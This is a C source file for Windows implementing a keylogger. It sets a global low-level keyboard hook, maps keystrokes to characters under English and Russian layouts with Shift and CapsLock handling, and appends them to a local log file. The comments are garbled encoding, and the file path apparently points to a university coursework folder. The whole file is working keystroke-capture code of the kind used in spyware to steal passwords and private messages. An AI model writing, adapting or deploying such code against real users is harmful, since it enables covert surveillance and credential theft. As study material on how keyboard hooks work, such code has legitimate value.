#include <Windows.h>
#include <malloc.h>
#include <locale.h>
#include <string.h>
#include <stdio.h>

#define SIZE_STR 1 << 8 // ������ ������ 2^8 = 256 ��������
#define PATH L"D:\\����� �����\\�����������\\3 ���� 2 �������\\Unix-��������� �������\\����\\3\\HOOK\\key.log"

// ��������� ����������
#define RUS 0x0419
#define ENG 0x0409

BOOL IsCaps(void); // ����� CAPSLOCK ��� SHIFT ?
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam); // �������� ������
VOID WriteToFile(LPWSTR wstr); // ������ � ����

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
	// ������� Handle Hook 
	// WH_KEYBOARD_LL ��������, ��� ��� ����� ������������� ����������
	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		LogKey, NULL, NULL);

	// ����������� ����
	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		// ��������� � ��������� ���������
		// � ������� ������ �� ����������
		// �� ������������� ������� 
		// � ������� �� �������� ������������ �����
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// ��������� ���
	UnhookWindowsHookEx(hHook);

	return 0;
}

// ������� ����������� ����, ��������� �� �� ������ � ������� �������� ��� ���
BOOL IsCaps(void)
{
	// GetKeyState ������������� � �������� ��� ����������� ��������� ������� ��������� ������
	// VK - Virtual Key
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	_wsetlocale(LC_ALL, L".866");
	if (wParam == WM_KEYDOWN) // ������������ ����� �� �����-�� ������
	{
		// ������ ���������� ��������� � �������
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		// �������� ������ ������
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5)) // 32
			iKey |= 0x1 << 24; //����� ������ ��� 24 ����
		LPWSTR wstr = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		// �� ������� ������ �������� �������� ������
		// ��� �������� ������ � ������� ��������
		GetKeyNameText(iKey, wstr, SIZE_STR);

		if (wcslen(wstr) > 1) //���� ��� ��������� ������
		{
			WriteToFile(L"[");
			WriteToFile(wstr);
			WriteToFile(L"]");
		}
		else
		{
			if (IsCaps() == TRUE)
			{
				switch (wstr[0])
				{
				case '1':
					WriteToFile(L"!");
					break;
				case '2':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"@");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"\"");
					break;
				case '3':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"#");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"�");
					break;
				case '4':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"$");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L";");
					break;
				case '5':
					WriteToFile(L"%");
					break;
				case '6':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"^");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L":");
				case '7':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"&");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"?");
					break;
				case '8':
					WriteToFile(L"*");
					break;
				case '9':
					WriteToFile(L"(");
					break;
				case '0':
					WriteToFile(L")");
					break;
				case '-':
					WriteToFile(L"_");
					break;
				case '=':
					WriteToFile(L"+");
					break;
				case '[':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"{");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"�");
					break;
				case ']':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"}");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"�");
					break;
				case ';':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L":");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"�");
					break;
				case '\'':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"\"");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"�");
					break;
				case ',':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"<");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"�");
					break;
				case '.':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L">");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"�");
					break;
				case '/':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"?");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L",");
					break;
				case '\\':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"|");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"/");
					break;
				case '`':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"~");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"�");
					break;
				default:
					WriteToFile(wstr);
					break;
				}

			}
			else
			{
				wstr[0] = tolower(wstr[0]);
				WriteToFile(wstr);
			}
		}
		free(wstr); // ������� ������
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}